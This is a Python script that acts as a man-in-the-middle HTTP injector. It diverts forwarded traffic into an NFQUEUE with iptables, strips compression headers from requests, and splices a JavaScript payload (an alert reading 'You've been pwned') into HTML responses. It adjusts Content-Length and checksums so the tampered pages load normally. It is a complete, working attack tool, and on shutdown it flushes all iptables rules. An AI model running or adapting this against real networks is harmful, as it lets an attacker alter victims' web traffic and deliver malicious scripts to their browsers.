import argparse
import os
import re

import colorama
import netfilterqueue
from colorama import Fore, Style

from scapy.layers.inet import IP, TCP
from scapy.packet import Raw

colorama.init()

GREEN = Fore.GREEN
RED = Fore.RED
RESET = Style.RESET_ALL
BRIGHT = Style.BRIGHT

JAVASCRIPT_TO_INJECT = "<script>alert(\"You've been pwned\");</script>"


def process_packet(packet):
    """
    This function is executed whenever a packet is sniffed
    """
    # convert the netfilterqueue packet into Scapy packet
    spacket = IP(packet.get_payload())

    if spacket.haslayer(Raw) and spacket.haslayer(TCP):
        if spacket[TCP].dport == 80:
            # HTTP request
            print(f"[*] Detected HTTP Request from {spacket[IP].src} to {spacket[IP].dst}")
            try:
                load = spacket[Raw].load.decode()
            except Exception as e:
                # raw data cannot be decoded, apparently not HTML
                # forward the packet exit the function
                packet.accept()
                return

            # remove Accept-Encoding header from the HTTP request, so we get a response as a plain text
            new_load = re.sub(r"Accept-Encoding:.*\r\n", "", load)
            # set the new data
            spacket[Raw].load = new_load
            # set IP length header, checksums of IP and TCP to None
            # so Scapy will re-calculate them automatically
            spacket[IP].len = None
            spacket[IP].chksum = None
            spacket[TCP].chksum = None
            # set the modified Scapy packet back to the netfilterqueue packet
            packet.set_payload(bytes(spacket))
        elif spacket[TCP].sport == 80:
            # HTTP response
            print(f"[*] Detected HTTP Response from {spacket[IP].src} to {spacket[IP].dst}")
            try:
                load = spacket[Raw].load.decode()
            except Exception as e:
                packet.accept()
                return

            added_text = JAVASCRIPT_TO_INJECT
            added_text_length = len(added_text)
            load = load.replace("</body>", added_text + "</body>")

            # if you want to inject to the begging, replace the line above with this one
            # load = load.replace("<body>", "<body>" + added_text)

            if "Content-Length" in load:
                content_length = int(re.search(r"Content-Length: (\d+)\r\n", load).group(1))
                new_content_length = content_length + added_text_length
                print("[~] Old content length:", content_length)
                print("[~] New content length:", new_content_length)
                load = re.sub(r"Content-Length:.*\r\n", f"Content-Length: {new_content_length}\r\n", load)

            if added_text in load:
                print(f"{GREEN}[+] Successfully injected code to {spacket[IP].dst}{RESET}")

            # set the new data
            spacket[Raw].load = load

            # set IP length header, checksums of IP and TCP to None
            # so Scapy will re-calculate them automatically
            spacket[IP].len = None
            spacket[IP].chksum = None
            spacket[TCP].chksum = None
            packet.set_payload(bytes(spacket))

    # accept all the packets
    packet.accept()


def set_iptables() -> None:
    """
    Sets iptables to jump all the forwarded tcp packets to NFQUEUE 0
    """
    os.system("sudo iptables -I FORWARD -p tcp -j NFQUEUE --queue-num 0")


def unset_iptables() -> None:
    os.system("sudo iptables -F")


def main(args):
    queue = netfilterqueue.NetfilterQueue()

    try:
        print("[*] Creating nfqueue")
        set_iptables()
        queue.bind(0, process_packet)
        print(f"{GREEN}[+]{RESET} Started")
        queue.run()
    except KeyboardInterrupt:
        pass
    finally:
        print(f"[*] Shutting down")
        unset_iptables()
        queue.unbind()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog='HTTP packets editor')
    args = parser.parse_args()

    main(args)
